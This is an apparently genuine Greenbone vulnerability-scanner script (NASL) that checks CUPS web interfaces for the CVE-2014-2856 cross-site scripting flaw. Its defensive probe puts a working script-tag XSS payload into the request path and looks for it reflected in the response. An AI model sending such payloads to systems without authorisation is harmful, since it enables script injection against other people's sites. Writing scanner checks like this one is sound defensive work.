# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apple:cups";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802071");
  script_version("2023-08-15T05:05:29+0000");
  script_tag(name:"last_modification", value:"2023-08-15 05:05:29 +0000 (Tue, 15 Aug 2023)");
  script_tag(name:"creation_date", value:"2014-04-22 13:16:12 +0530 (Tue, 22 Apr 2014)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2014-2856");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("CUPS Web Interface < 1.7.2 XSS Vulnerability");

  script_category(ACT_ATTACK);

  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_cups_http_detect.nasl");
  script_require_ports("Services/www", 631);
  script_mandatory_keys("cups/http/detected");

  script_tag(name:"summary", value:"Common Unix Printing System (CUPS) is prone to a cross-site
  scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is
  able to get domain or not.");

  script_tag(name:"insight", value:"Flaws is due to is_path_absolute()function does not validate input
  via URL path before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"CUPS prior to version 1.7.2.");

  script_tag(name:"solution", value:"Update to version 1.7.2 or later.");

  script_xref(name:"URL", value:"http://www.cups.org/str.php?L4356");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/66788");
  script_xref(name:"URL", value:"http://secunia.com/advisories/57880/");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2014/04/14/2");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/<SCRIPT>alert(document.domain)</SCRIPT>.shtml";
req = http_get(item:url, port:port);
res = http_send_recv(port:port, data:req);

## Patched version reply with specific code/message
if(res !~ "^HTTP/1\.[01] 403" && "<SCRIPT>alert(document.domain)</SCRIPT>" >< res){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
